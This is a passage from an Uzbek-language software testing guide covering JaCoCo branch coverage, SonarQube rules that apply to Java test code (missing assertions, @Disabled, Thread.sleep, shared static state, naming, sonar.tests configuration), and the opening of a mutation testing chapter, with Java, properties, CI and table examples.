-- Oldin: Java da sikl va if bilan filtrlangan edi.
-- Keyin: shart SQL ga ko'chdi, Java da tarmoq qolmadi.
SELECT o.id, o.total_amount, o.status
FROM orders o
JOIN merchants m ON m.id = o.merchant_id
WHERE o.status = 'PAID'
  AND o.created_at >= :fromDate
  AND (o.total_amount <= m.daily_limit OR o.manually_approved = true)
ORDER BY o.created_at DESC;
```

```java
// Oldin: 3 ta if, 6 tarmoq, har biri uchun test kerak
BigDecimal fee(OrderStatus s) {
    if (s == OrderStatus.PAID) return new BigDecimal("0.02");
    if (s == OrderStatus.SHIPPED) return new BigDecimal("0.03");
    if (s == OrderStatus.CANCELLED) return BigDecimal.ZERO;
    return BigDecimal.ZERO;
}

// Keyin: 0 tarmoq, bitta parametrli test hammasini qoplaydi
private static final Map<OrderStatus, BigDecimal> FEES = Map.of(
        OrderStatus.PAID, new BigDecimal("0.02"),
        OrderStatus.SHIPPED, new BigDecimal("0.03"),
        OrderStatus.CANCELLED, BigDecimal.ZERO);

BigDecimal fee(OrderStatus s) {
    return FEES.getOrDefault(s, BigDecimal.ZERO);
}
```

### 18.12 Tuzoq va yechim

| Tuzoq | Nima bo'ladi | Yechim |
|---|---|---|
| Faqat `line_coverage` ni kuzatish | Gate `coverage` da yiqiladi, sabab tushunarsiz | `branch_coverage` va `uncovered_conditions` metrikasini ham panelga qo'yish |
| `enum` `switch` ifodasida "1 branch missed" | Yopilmaydigan tarmoqni quvib vaqt ketadi | Yashirin `default` ni qabul qilish, qamrov chegarasini CLASS darajasida belgilash |
| Qo'lda `finally` va `null` tekshiruvi | Qoplanmaydigan tarmoqlar ko'payadi | `try-with-resources` ga o'tish |
| Keraksiz null tekshiruvi ichki metodda | Tarmoq hech qachon yopilmaydi | Konstruktorda `requireNonNull`, ichkarida tekshiruvni o'chirish |
| Lombok va MapStruct generatsiyasi | Begona tarmoqlar foizni pasaytiradi | `sonar.coverage.exclusions` va JaCoCo `excludes` da chiqarish |
| 100% tarmoq, 0 ta assertion | Yashil raqam, himoya yo'q | Mutation testing yoki assertion sifatini review da tekshirish |
| Chegara qiymati sinalmagan | `>` va `>=` xatosi ushlanmaydi | Har bir solishtirishga past, teng, baland uchligini berish |
| `catch` da faqat log | Istisno tarmog'i ochiq, qoida ham buziladi | `catch` ga aniq xatti harakat berish va uni `verify` bilan tekshirish |

### 18.13 Oddiy yondashuv va arxitektor yondashuvi

| Savol | Oddiy yondashuv | Arxitektor yondashuvi |
|---|---|---|
| Qamrov maqsadi | Umumiy foizni 80 ga ko'tarish | Yangi kod uchun tarmoq qamrovini majburiy qilish, eski kodni qoldirish |
| Murakkab shart | Bitta test yozib yashil qatorga qanoat qilish | Haqiqat jadvalini tuzib, har bir tarmoqqa qator ajratish |
| Test yozish tartibi | Kod bitgandan keyin qamrovni to'ldirish | Jadvalni kod bilan birga tuzib, `@CsvSource` ga ko'chirish |
| Yopilmaydigan tarmoq | Soxta test yozib yoki `@Generated` qo'yib yashirish | Shartni o'chirish yoki kompilyator yasagan tarmoq ekanini hujjatlash |
| `if` zanjiri | Har bir shoxga alohida test | Zanjirni `Map` yoki strategiyaga aylantirib tarmoqni yo'qotish |
| Null | Ehtiyot uchun hamma joyda tekshirish | Chegarada bir marta tekshirish, ichkarida shartnomaga tayanish |
| Istisno yo'llari | Test qilish qiyin deb o'tkazib yuborish | Mock bilan har bir `catch` ning xatti harakatini tekshirish |
| Sikl | Bitta ro'yxat bilan test | Bo'sh, bitta, ko'p va chegara qiymatlari to'rtligi |
| Gate buzilganda | Chegarani pasaytirish | Tarmoq sonini kamaytirib kodni soddalashtirish |
| Qamrov ishonchi | Foiz yetarli dalil | Mutation testing bilan assertion sifatini alohida o'lchash |

### 18.14 Sonar ga tarmoq ma'lumotini uzatish

Sonar o'zi qamrov o'lchamaydi, u JaCoCo ning XML hisobotini o'qiydi. Shuning uchun XML generatsiyasi yoqilgan va yo'l to'g'ri ko'rsatilgan bo'lishi kerak.

```properties
# sonar-project.properties: tarmoq ma'lumoti JaCoCo XML dan keladi
sonar.projectKey=payments-service
sonar.java.source=21
sonar.coverage.jacoco.xmlReportPaths=target/site/jacoco-aggregate/jacoco.xml,\
  target/site/jacoco/jacoco.xml
sonar.junit.reportPaths=target/surefire-reports,target/failsafe-reports
# generatsiya qilingan kod qamrovsiz
sonar.coverage.exclusions=**/config/**,**/dto/**,**/*Application.java
# lekin code smell tekshiruvida qoladi
sonar.exclusions=**/generated/**
```

```bash
# Avval hisobot, keyin tahlil
./mvnw clean verify -Pcoverage

# Yopilmagan tarmoqlarni terminalda ko'rish
grep -o 'missedb="[1-9][0-9]*"[^>]*' target/site/jacoco/jacoco.xml | head -20

# Sonar ga yuborish: XML mavjud bo'lishi shart
./mvnw sonar:sonar -Dsonar.host.url="$SONAR_URL" -Dsonar.token="$SONAR_TOKEN"

# Gate natijasini kutish
./mvnw sonar:sonar -Dsonar.qualitygate.wait=true -Dsonar.qualitygate.timeout=600
```

```yaml
# CI: test va tahlil bitta job da
jobs:
  verify:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0   # new code aniqlash uchun butun tarix kerak
      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '21'
      - name: Test va JaCoCo
        run: ./mvnw -B clean verify
      - name: Branch chegarasi
        run: ./mvnw -B jacoco:check@check-branches
      - name: Sonar tahlili
        env:
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
        run: ./mvnw -B sonar:sonar -Dsonar.qualitygate.wait=true
```

Halol xulosa: 100% tarmoq qamrovi xatosiz kodni kafolatlamaydi. JaCoCo kombinatsiyalarni emas, alohida natijalarni sanaydi va assertion sifatini o'lchamaydi. Tarmoq qamrovi faqat "bu qaror hech qachon sinalmagan" holatini ushlaydigan quyi chegara. Shartni soddalashtirib tarmoq sonini kamaytirish, qolganini jadval orqali ataylab yopish eng barqaror strategiya.

### 18.15 Amalda qo'llash

- [ ] Sonar loyiha panelida `branch_coverage` va `uncovered_conditions` metrikalarini qo'shib, eng ko'p yopilmagan shart saqlagan 10 ta sinfni ro'yxatga oling.
- [ ] Shu ro'yxatdagi eng murakkab shartni oling, uning atomar shartlarini sanab haqiqat jadvalini tuzing va `@CsvSource` parametrli testga ko'chiring.
- [ ] `jacoco-maven-plugin` ga `BRANCH` va `COVEREDRATIO` chegarasi bilan `check` qoidasini qo'shib, generatsiya qilingan sinflarni `excludes` ga kiriting.
- [ ] Barcha qo'lda yozilgan `finally` bloklarini `try-with-resources` ga o'tkazing va `java:S2095` ogohlantirishlari yo'qolganini tekshiring.
- [ ] Ichki domen metodlaridagi null tekshiruvlarini ko'rib chiqing: konstruktorda bir marta `requireNonNull` qoldirib, qolganini o'chiring.
- [ ] Har bir `catch` bloki uchun mock bilan xato yuzaga keltiruvchi test yozing va `catch` ichidagi xatti harakatni `verify` bilan tasdiqlang.
- [ ] Kamida bitta uzun `if` zanjirini `Map` yoki strategiyaga aylantirib, tarmoq soni va cognitive complexity qanchaga kamayganini o'lchab yozib qo'ying.
- [ ] CI da `fetch-depth: 0` va `sonar.qualitygate.wait=true` yoqilganini tekshirib, gate qizil bo'lganda pipeline haqiqatan yiqilishiga ishonch hosil qiling.

## 19. Testning o'zidagi Sonar qoidalari va test sifati (Sonar Rules on Test Code)

Ko'p jamoa Sonar faqat `src/main/java` ni ko'radi deb o'ylaydi. Bu xato: Sonar test fayllarini ham skanerlaydi, ularda ham issue ochadi va bu issue'lar quality gate'ga tushadi. Lekin test kodiga asosiy koddan boshqa qoidalar to'plami ishlaydi, chunki har bir qoidaning "scope" xossasi bor. Bu bobda aynan shu mexanika va undan kelib chiqadigan test yozish usuli ko'rilgan.

### 19.1 Sonar test kodini ham tahlil qiladi: qaysi qoidalar unga tegishli

Sonar'dagi har bir qoidada `scope` degan xossa bor va uning uchta qiymati bo'ladi: Main sources, Test sources, yoki ikkisi birga. Rules UI'da yon paneldagi "Scope" filtri shuni ko'rsatadi. Shuning uchun "nega bu qoida testda ishlamadi" degan savolga javob ko'pincha quality gate'da emas, qoidaning scope'ida bo'ladi.

Amalda uchta guruh ajraladi. Birinchi guruh faqat test kodida ishlaydi: assertion yo'qligi, o'chirilgan test, `Thread.sleep`, assertion argumentlari tartibi. Ikkinchi guruh faqat asosiy kodda ishlaydi: magic number, production kodda `assert` kalit so'zi. Uchinchi guruh ikkala joyda ham ishlaydi: cognitive complexity, takrorlangan string literal, ishlatilmagan o'zgaruvchi, bo'sh `catch` bloki.

Natijada test fayli Sonar hisobotida ikki marta ko'rinadi. Birinchi marta coverage manbasi sifatida: test ishga tushganda qaysi asosiy qatorlar bajarilganini JaCoCo yozadi. Ikkinchi marta tahlil obyekti sifatida: test faylining o'zidagi code smell'lar Maintainability o'lchoviga qo'shiladi. Ikkinchisini e'tibordan qoldirgan jamoa "coverage 85%, lekin gate qizil" holatiga tushadi.

| Tuzoq | Nega yuz beradi | Yechim |
| --- | --- | --- |
| Test papkasi `sonar.sources` ichida | `sonar.tests` ko'rsatilmagan | `sonar.tests=src/test/java` ni aniq yoz |
| Testdagi issue gate'ni buzadi | New Code'dagi issue manba turini ajratmaydi | Qoidani profil darajasida test uchun o'chir, faylni emas |
| Coverage 0% ko'rinadi | JaCoCo report yo'li noto'g'ri | `sonar.coverage.jacoco.xmlReportPaths` ni tekshir |
| Test fayli coverage'ni "suyultiradi" | Test papkasi sources deb belgilangan | Papkalarni to'g'ri ajrat |
| Testda hardcoded parol hotspot beradi | `java:S2068` test kodida ham ishlaydi | Aniq qoida uchun `issue.ignore` yoz, izoh bilan |
| Testdagi smell abadiy qoladi | Hech kim test faylini refaktor qilmaydi | Test kodini ham Definition of Done'ga kirit |

### 19.2 Assertion siz test va u nega buzilgan hisoblanadi

`java:S2699` qoidasi test metodida hech qanday assertion yo'qligini topadi va bu Bug kategoriyasiga tushadi, ya'ni Reliability o'lchovini buzadi. Sonar buni shunday izohlaydi: assertion siz test faqat "exception tashlanmadi" degan faktni tekshiradi, lekin natijani tekshirmaydi. Bunday test yashil bo'lib turadi va coverage beradi, holbuki mantiq buzilgan bo'lsa ham sezmaydi.

Eng xavfli ko'rinish shundaki, assertion bor ko'rinadi, lekin yarim. AssertJ'da `assertThat(x)` yozilib, keyin hech qanday tekshiruv metodi chaqirilmasa, bu to'liqsiz assertion bo'ladi va `java:S2970` shunga reaksiya qiladi. Shuningdek `assertThrows` ichiga bir nechta chaqiruv solinsa, qaysi biri exception tashlaganini bilmaymiz va `java:S5778` shuni belgilaydi.

```java
// Sonar shikoyat qiladi: java:S2699 (assertion yo'q)
@Test
void shouldCreateOrder() {
    orderService.create(new OrderRequest("SKU-1", 2));
}

// Sonar shikoyat qiladi: java:S2970 (assertion to'liq emas)
@Test
void shouldReturnTotal() {
    assertThat(orderService.total(order)); // tekshiruv metodi yo'q
}

// Sonar o'tadigan variant: natija aniq tekshirilgan
@Test
void shouldCreateOrderWithReservedStock() {
    Order created = orderService.create(new OrderRequest("SKU-1", 2));

    assertThat(created.status()).isEqualTo(OrderStatus.RESERVED);
    assertThat(created.lines()).hasSize(1);
    assertThat(stockRepository.findBySku("SKU-1").reserved()).isEqualTo(2);
}
```

Agar test chindan ham faqat "xatolik bo'lmasligini" tekshirsa, buni ham assertion bilan ayt. `assertThatCode(() -> service.run()).doesNotThrowAnyException()` yozilgan test Sonar uchun to'g'ri, chunki niyat kodda ko'rinadi. Bo'sh metod esa niyatni yashiradi va shuning uchun bug deb hisoblanadi.

Yana bir nozik joy: JUnit 4'dan 5'ga o'tishda `assertEquals(expected, actual)` argumentlari almashtirilib yuborilsa, `java:S3415` ishga tushadi. Bu faqat estetika emas. Argumentlar teskari bo'lsa, test yiqilganda xabar chalg'itadi va debug vaqti ikki barobar oshadi.

### 19.3 O'chirilgan yoki e'tiborsiz qoldirilgan test (`@Disabled`) va uning hisobi

`java:S1607` qoidasi o'chirilgan testni topadi: JUnit 4'da `@Ignore`, JUnit 5'da `@Disabled`. Sonar uning sababini emas, mavjudligini belgilaydi. Mantiq oddiy: o'chirilgan test na himoya beradi, na coverage beradi, lekin "test bor" degan tasavvur qoldiradi.

Bu yerda halol gap kerak. Qoidani qondirishning ikki yo'li bor va faqat bittasi to'g'ri. Noto'g'ri yo'l: `@Disabled` ni olib tashlab, test tanasini bo'shatib qo'yish. Shunda `java:S1607` ketadi, lekin `java:S2699` keladi. To'g'ri yo'l: testni tuzatish yoki uni butunlay o'chirib, o'rniga issue tracker'da vazifa qoldirish.

```java
// Sonar shikoyat qiladi: java:S1607, sabab ham yozilmagan
@Disabled
@Test
void shouldRefundPaymentWhenOrderCancelled() { ... }

// Agar vaqtincha o'chirish zarur bo'lsa: sabab va muddat aniq
@Disabled("PAY-412: sandbox gateway 5xx qaytaradi, 2026-11-01 da qayta yoqiladi")
@Test
void shouldRefundPaymentWhenOrderCancelled() { ... }

// Eng yaxshisi: o'chirish emas, shartli ishga tushirish
@Test
@EnabledIfEnvironmentVariable(named = "PAYMENT_SANDBOX", matches = "true")
void shouldRefundPaymentWhenOrderCancelled() {
    PaymentResult result = paymentService.refund(order.id());

    assertThat(result.status()).isEqualTo(RefundStatus.ACCEPTED);
}
```

`@EnabledIf...` yondashuvi Sonar uchun `@Disabled` dan yaxshiroq, chunki test butunlay o'lgan emas: sharti bajarilgan muhitda ishlaydi. Shuningdek JUnit 5'ga o'tgan loyihalarda `java:S5786` muhim: test klassi yoki metodi noto'g'ri ko'rinish darajasiga ega bo'lsa, JUnit uni jim o'tkazib yuboradi. Bu "o'chirilgan test" ning eng yomon turi, chunki hech kim buni bilmaydi.

### 19.4 Testda `Thread.sleep` va vaqtga bog'liqlik

`java:S2925` qoidasi test kodida `Thread.sleep` ishlatilishini topadi. Sonar uning sababi sifatida flaky bo'lish xavfini ko'rsatadi: kutish vaqti CI mashinasining yuklamasiga bog'liq, shuning uchun lokalda o'tgan test build serverda yiqiladi. Qoida test scope'ida ishlaydi, ya'ni asosiy kodda `Thread.sleep` boshqa qoidalar ostida ko'riladi.

Yechim kutishni shartga bog'lashdir. Awaitility kutuvni "qancha vaqt" dan "nima bo'lishini" ga aylantiradi va `java:S2925` ni tabiiy yo'l bilan yopadi, chunki `Thread.sleep` umuman qolmaydi.

```java
// Sonar shikoyat qiladi: java:S2925
@Test
void shouldPublishOrderEvent() throws InterruptedException {
    orderService.create(request);
    Thread.sleep(2000); // CI da 2 sekund yetmasligi mumkin
    assertThat(eventStore.count()).isEqualTo(1);
}

// Sonar o'tadigan variant: shartga asoslangan kutish
@Test
void shouldPublishOrderEventWithinTimeout() {
    orderService.create(request);

    await().atMost(Duration.ofSeconds(5))
           .untilAsserted(() -> assertThat(eventStore.findByOrderId(request.id()))
                   .hasSize(1));
}
```

Vaqtga bog'liqlikning ikkinchi ko'rinishi `LocalDate.now()` ni test ichida chaqirishdir. Sonar bunga alohida qoida bilan reaksiya qilmasligi mumkin, lekin natija bir xil: oyning oxirgi kunida yoki yil almashganda test yiqiladi. To'g'ri yechim asosiy kodga `Clock` ni inject qilish va testda `Clock.fixed(...)` berish. Bu Sonar nuqtai nazaridan ham foydali, chunki `Clock` ni parametr qilish asosiy koddagi statik chaqiruvni kamaytiradi va testning cognitive complexity'sini pasaytiradi.

### 19.5 Testda umumiy holat va testlar tartibiga bog'liqlik

Sonar'da "testlar bir-biriga bog'liq" degan to'g'ridan to'g'ri qoida yo'q, lekin uning belgilarini topadigan qoidalar bor. Eng aniqi `java:S2386`: o'zgartirilishi mumkin bo'lgan `public static` maydon. Test klassida `static List<Order> created = new ArrayList<>()` yozilsa, bu bir testdan ikkinchisiga holat olib o'tadi va aynan shu qoida ishga tushadi.

Mexanika shunday: JUnit 5 sinf uchun yangi nusxa yaratadi, lekin `static` maydon umumiy qoladi. Shuning uchun `static` holat tartibga bog'liqlik keltiradi, Sonar esa buni "o'zgaruvchan umumiy holat" sifatida belgilaydi. Qo'shimcha signal `@TestMethodOrder` bilan tartibni qotirishdir: bu Sonar qoidasi emas, lekin review'da to'xtatish kerak bo'lgan naqsh.

```java
// Muammoli: static holat testlar orasida oqib ketadi (java:S2386)
class StockServiceTest {
    static Map<String, Integer> stock = new HashMap<>();

    @Test void shouldReserve() { stock.put("SKU-1", 5); ... }
    @Test void shouldRelease() { assertThat(stock).containsKey("SKU-1"); }
}

// Tozalangan: holat har testda qaytadan quriladi
class StockServiceTest {
    private StockService service;
    private InMemoryStockRepository repository;

    @BeforeEach
    void setUp() {
        repository = new InMemoryStockRepository();
        service = new StockService(repository);
    }

    @Test
    void shouldReserveRequestedQuantity() {
        repository.save(new Stock("SKU-1", 5));

        service.reserve("SKU-1", 2);

        assertThat(repository.findBySku("SKU-1").available()).isEqualTo(3);
    }
}
```

Spring kontekstidagi varianti ham bor: `@MockBean` yoki `@SpyBean` orqali sozlangan stub kontekst keshida qoladi va keyingi test klassiga o'tadi. Sonar bunga qoida bermaydi, lekin `@DirtiesContext` ning ko'payishi loyihada muammo borligini bildiradi. Bu holatda arxitektura darajasidagi qarorni testlash qo'llanmasidagi test izolyatsiyasi mavzusidan oling.

### 19.6 Juda ko'p mock va haddan tashqari bog'langan test

Sonar'da "mock soni ko'p" degan qoida yo'q. Buni ochiq aytish kerak, chunki ko'p maqolada aks fikr uchraydi. Lekin ortiqcha mock bilvosita o'lchanadi va aynan shu bilvosita o'lchov gate'ni buzadi.

Birinchi o'lchov `java:S3776`, cognitive complexity. Qoida test metodlariga ham tegishli, chunki uning scope'i ikkala manbani qamraydi. Yettita mock sozlangan test metodida shartlar, lambda'lar va `when(...)` zanjirlari yig'ilib, standart 15 limitidan oshadi. Ikkinchi o'lchov `java:S1448`, klassda metodlar soni juda ko'p. Uchinchisi `java:S107`, yordamchi metodda parametr juda ko'p: odatda bu "test ma'lumotini qurish uchun hamma narsani uzatamiz" degan naqshning natijasi.

```java
// Sonar shikoyat qiladi: java:S3776 (test metodining complexity'si yuqori)
@Test
void shouldProcessPayment() {
    when(customerRepo.findById(1L)).thenReturn(Optional.of(customer));
    when(cardValidator.validate(any())).thenReturn(true);
    when(fraudClient.score(any())).thenReturn(12);
    when(limitService.check(any(), any())).thenReturn(ALLOWED);
    when(gateway.charge(any())).thenAnswer(inv -> {
        ChargeRequest r = inv.getArgument(0);
        return r.amount().compareTo(LIMIT) > 0 ? DECLINED : APPROVED;
    });
    ...
}
```

Yechim mock sonini kamaytirish uchun asosiy kodni bo'lishdir. Agar `PaymentService` beshta hamkorga bog'langan bo'lsa, test ham beshta mock talab qiladi. Fraud tekshiruvi va limit tekshiruvini bitta `PaymentPolicy` ortiga yashirsangiz, test ikki mock bilan ishlaydi va `java:S3776` o'zidan ketadi. Ya'ni Sonar'ning test metodidagi shikoyati ko'pincha asosiy koddagi dizayn muammosining signali bo'ladi.

Ikkinchi yechim: `thenAnswer` ichidagi mantiqni fake obyektga ko'chirish. Fake klass alohida fayl bo'ladi, uning complexity'si o'z metodlari orasida taqsimlanadi va test metodi uch qatorga tushadi.

### 19.7 Test metodining nomi va uning hujjat sifatidagi roli

`java:S100` metod nomlash konvensiyasini tekshiradi va uning standart regex'i pastki chiziqga ruxsat bermaydi. Shuning uchun `given_validCard_when_charge_then_approved` uslubini tanlagan jamoa yuzlab issue oladi. Bu yerda ikki qarorning biri kerak, va ikkisi ham to'g'ri bo'lishi mumkin.

Birinchi qaror: nomlash uslubini camelCase'ga keltirish, masalan `shouldApproveChargeWhenCardIsValid`. Ikkinchi qaror: quality profile'da `java:S100` qoidasining `format` parametrini o'zgartirish, pastki chiziqli nomga ruxsat berish. Muhimi shuki, bu qoidani butunlay o'chirib tashlamang: u asosiy kodda ham ishlaydi va u yerda kerak. Parametrni o'zgartirish faylni exclude qilishdan ancha yaxshi.

Uchinchi tegishli qoida `java:S3577`: test klassi nomlash konvensiyasiga mos kelmasa. Bu qoida bilan birga `java:S2187` ishlaydi: nomi `...Test` bo'lgan, lekin ichida test metodi yo'q klass. Ikkisi birgalikda "fayl bor, test yo'q" holatini yopadi.

Nom Sonar uchun shuning uchun muhim: nomi `test1` bo'lgan metod yiqilganda CI log'da hech narsa aytmaydi. Nom aytib beradigan test esa yiqilish sababini o'qishdan oldin ko'rsatadi va bu flaky testlarni saralashda vaqt tejaydi.

### 19.8 Test kodidagi takrorlanish: fixture va yordamchi metodlar

Sonar takrorlanishni ikki xil o'lchaydi. Birinchisi `Duplicated Lines` metrikasi, ikkinchisi qoidalar: `java:S1192` takrorlangan string literal va `java:S4144` bir xil tanaga ega metodlar. Diqqat qiling: `Duplicated Lines` metrikasi ko'p sozlamalarda test fayllarida hisoblanmaydi, lekin `java:S1192` va `java:S4144` issue sifatida testda ham chiqadi. Loyihangizda aynan qanday ishlayotganini Measures sahifasidan tekshirib ko'ring, chunki bu versiya va sozlamaga qarab farq qiladi.

```java
// Sonar shikoyat qiladi: java:S1192 ("SKU-1" uch martadan ko'p takrorlangan)
@Test void t1() { service.reserve("SKU-1", 1); }
@Test void t2() { service.reserve("SKU-1", 2); }
@Test void t3() { service.release("SKU-1"); }

// Tozalangan: konstanta va builder
private static final String SKU = "SKU-1";

private static Order orderWith(int quantity) {
    return Order.builder().sku(SKU).quantity(quantity).build();
}
```

`java:S5976` alohida eslatishga arziydi: bir xil shaklda, faqat ma'lumoti farq qiladigan bir nechta test uchun parameterized test taklif qiladi. Uchta deyarli bir xil `@Test` metodini bitta `@ParameterizedTest` ga aylantirish ham bu qoidani yopadi, ham `java:S4144` xavfini kamaytiradi. Lekin ehtiyot bo'ling: hamma takrorlanish yomon emas. Test kodida ozgina takrorlanish o'qilishini oshirsa, abstraksiyadan ko'ra foydali bo'ladi va bu holatda issue'ni "won't fix" bilan yopish asosli qaror.

### 19.9 Testdagi magic number va tushunarsiz ma'lumot

`java:S109`, magic number qoidasi, ko'p profilda faqat asosiy kodda ishlaydi. Shuning uchun testda `assertThat(total).isEqualTo(237.50)` yozsangiz, Sonar jim turadi. Bu Sonar'ning testda sifat talab qilmasligini bildirmaydi, faqat bu aniq qoida test scope'iga kirmaydi.

Lekin bilvosita ta'sir bor. Tushunarsiz raqamlar testni uzaytiradi, yordamchi metodlar ko'payadi va oxirida `java:S3776` yoki `java:S1448` ishga tushadi. Shuning uchun magic number'ni testda ham nomlang, lekin sababini to'g'ri aytib: bu Sonar talabi emas, bu yiqilgan testni o'qiy olish talabi.

```java
// Tushunarsiz: 237.50 qayerdan keldi
@Test
void shouldCalculateInvoiceTotal() {
    assertThat(invoiceService.total(invoice)).isEqualByComparingTo("237.50");
}

// Tushunarli: hisob kodda ko'rinadi
private static final BigDecimal UNIT_PRICE = new BigDecimal("95.00");
private static final BigDecimal VAT_RATE = new BigDecimal("0.25");

@Test
void shouldAddVatToLineTotalForTwoUnits() {
    BigDecimal expected = UNIT_PRICE.multiply(BigDecimal.valueOf(2))
            .multiply(BigDecimal.ONE.add(VAT_RATE));

    assertThat(invoiceService.total(invoiceWith(2, UNIT_PRICE)))
            .isEqualByComparingTo(expected);
}
```

Testda hardcoded ma'lumotning yana bir turi Sonar'ni chindan ham qo'zg'atadi: `java:S2068`, kodga yozilgan parol. Test resource'laridagi `spring.datasource.password=test` qatori security hotspot sifatida chiqadi. Buni fayl bo'yicha exclude qilmang, aniq qoida va aniq yo'l bo'yicha `issue.ignore` yozib, sababini izohda qoldiring.

### 19.10 Test fayllarini Sonar uchun to'g'ri belgilash (`sonar.tests`)

Bu bo'lim butun bobning asosi. Agar Sonar test fayllarini asosiy manba deb bilsa, hamma hisob buziladi: coverage pasayadi, chunki test fayllari o'zlari qoplanmagan qator sifatida hisoblanadi, test scope'idagi qoidalar esa umuman ishga tushmaydi. Maven va Gradle plugin'lari standart papka tuzilmasini o'zi aniqlaydi, lekin ko'p modulli yoki nostandart loyihada buni qo'lda yozish kerak.

```properties
# Asosiy va test manbalarini aniq ajratish
sonar.sources=src/main/java
sonar.tests=src/test/java,src/integrationTest/java

# JaCoCo XML hisobotining yo'li (agregat modul bo'lsa hammasini sanab o't)
sonar.coverage.jacoco.xmlReportPaths=target/site/jacoco/jacoco.xml

# Test kodini kompilyatsiya natijasi: semantik tahlil uchun zarur
sonar.java.test.binaries=target/test-classes
sonar.java.test.libraries=target/test-libs/*.jar

# Qaysi fayllar test deb sanaladi (nostandart joylashuvda)
sonar.test.inclusions=**/*Test.java,**/*IT.java,**/*Tests.java
```

`sonar.java.test.binaries` ni tashlab ketish keng tarqalgan xato. Bu sozlama bo'lmasa, Sonar test fayllarini faqat sintaktik darajada ko'radi va assertion bilan bog'liq qoidalarning ko'pi ishlamaydi, chunki ular tiplarni bilishni talab qiladi. Tahlil log'ida bu haqda ogohlantirish chiqadi va uni o'qish kerak.

Keyingi qadam: testdagi ayrim qoidalarni maqsadli o'chirish. Butun faylni exclude qilish eng yomon variant, chunki u bilan birga foydali qoidalar ham ketadi.

```properties
# Faqat test resource'laridagi parol hotspot'ini jim qildirish
sonar.issue.ignore.multicriteria=e1,e2
sonar.issue.ignore.multicriteria.e1.ruleKey=java:S2068
sonar.issue.ignore.multicriteria.e1.resourceKey=**/src/test/resources/**

# Fake va test double klasslarida nomlash qoidasini yumshatish
sonar.issue.ignore.multicriteria.e2.ruleKey=java:S3577
sonar.issue.ignore.multicriteria.e2.resourceKey=**/testsupport/**

# Coverage hisobidan generatsiya qilingan kodni chiqarish
sonar.coverage.exclusions=**/config/**,**/*Application.java,**/dto/**
```

### 19.11 Test sifatini o'lchash: qamrov emas, nimani tekshirayotgani

Oxirgi va eng muhim fikr: Sonar coverage raqamini ko'rsatadi, lekin test nimani tekshirayotganini bilmaydi. `java:S2699` faqat assertion mavjudligini ko'radi, uning kuchini ko'rmaydi. Shuning uchun `assertThat(result).isNotNull()` bilan tugaydigan yuzta test 90% coverage va yashil gate beradi, holbuki biror mantiq buzilsa hech biri sezmaydi.

Bu yerda halol bo'lish kerak: Sonar bu bo'shliqni yopa olmaydi. U sintaksis va bajarilgan qatorlarni biladi, niyatni bilmaydi. Shuning uchun quality gate'ni test sifatining o'lchovi deb emas, test sifatining minimal poli deb qarash kerak. Haqiqiy o'lchov uchun mutation testing yoki review kerak, va buni testlash qo'llanmasidagi test sifati metrikalari mavzusidan qarang.

| Masala | Oddiy yondashuv | Arxitektor yondashuvi |
| --- | --- | --- |
| Test kodidagi issue | "Bu test, muhim emas" | Test kodi ham gate'ga kiradi, DoD'ga kirit |
| `@Disabled` test | Sababsiz qo'shib qo'yiladi | Ticket raqami, muddat, yoki shartli yoqish |
| Kutish | `Thread.sleep(2000)` | Awaitility va `untilAsserted` |
| Vaqt | `LocalDate.now()` testda | Inject qilingan `Clock.fixed(...)` |
| Ko'p mock bilan test | Mock'ni ko'paytiradi | Asosiy kodni bo'lib mock'ni kamaytiradi |
| Qoida xalaqit berganda | Faylni butunlay exclude qiladi | Qoida parametrini yoki aniq `issue.ignore` ni sozlaydi |
| Test nomi | `test1`, `testOrder` | Xatti harakat va kutilgan natija nomda |
| Takrorlanish | Copy paste yoki ortiqcha abstraksiya | Builder, parameterized test, o'qilishi muhim joyda takror qoldiradi |
| Coverage 90% | "Sifat yetarli" | Assertion kuchini review va mutation bilan tekshiradi |
| Test konfiguratsiyasi | Standart holatga tayanadi | `sonar.tests` va `test.binaries` ni aniq yozadi |

### 19.12 Amalda qo'llash

- [ ] `sonar-project.properties` yoki `pom.xml` da `sonar.sources`, `sonar.tests` va `sonar.java.test.binaries` ni aniq yozib, tahlil log'ida test manbalari soni to'g'ri ko'rsatilganini tekshir.
- [ ] Sonar UI'da Issues bo'limini `Scope: Test sources` bo'yicha filtrlab, test kodidagi joriy issue sonini yozib qo'y: bu sizning boshlang'ich nuqtangiz.
- [ ] `java:S2699` va `java:S2970` bo'yicha chiqqan hamma issue'ni ko'rib chiq va har birini yo assertion qo'shish bilan, yo testni o'chirish bilan yop.
- [ ] Kod bazasida `Thread.sleep` ni test papkalarida qidirib, har birini Awaitility'ning `untilAsserted` chaqiruviga aylantir.
- [ ] Hamma `@Disabled` annotatsiyasiga sabab matni va ticket raqamini qo'sh, uch oydan oshganini esa butunlay o'chir.
- [ ] Quality profile'da `java:S100` qoidasining `format` parametrini jamoangiz nomlash uslubiga moslashtir, qoidani o'chirmay.
- [ ] Test klasslarida `static` o'zgaruvchan maydonlarni qidirib, holatni `@BeforeEach` ga ko'chir va `java:S2386` issue'larini yop.
- [ ] Cognitive complexity'si limitdan oshgan test metodlarini ro'yxatga ol va har biri uchun qaror yoz: fake'ga ko'chirish, yoki asosiy kodni bo'lish.

## 20. Mutation testing: 100% coverage qachon yolg'on (Mutation Testing)

Coverage raqami kodning bajarilganini o'lchaydi, tekshirilganini emas. JaCoCo
qatorga bayroq qo'yadi: bu qator test paytida ishga tushdi. Lekin natija to'g'rimi
yoki yo'qmi, JaCoCo buni bilmaydi. Mutation testing shu bo'shliqni yopadi: kodni
ataylab buzadi va testlar buzilganni sezadimi deb so'raydi.

### 20.1 100% coverage bilan hech narsani tekshirmaydigan test to'plami misoli

Quyida ombor qoldig'ini hisoblaydigan servis. Mantiq sodda, lekin ichida ikkita
chegara sharti bor.

```java
@Service
public class StockService {

    private final StockRepository repository;

    public StockService(StockRepository repository) {
        this.repository = repository;
    }

    // Omborda yetarli qoldiq bormi va rezerv limitidan oshmaydimi
    public ReservationResult reserve(String sku, int quantity) {
        StockItem item = repository.findBySku(sku);
        if (item == null) {
            return ReservationResult.notFound(sku);
        }
        if (quantity > item.available()) {
            return ReservationResult.rejected("Qoldiq yetarli emas");
        }
        int remaining = item.available() - quantity;
        repository.updateAvailable(sku, remaining);
        return ReservationResult.accepted(remaining);
    }
}
```

Endi shu klassga 100% line va branch coverage beradigan test to'plami. Diqqat
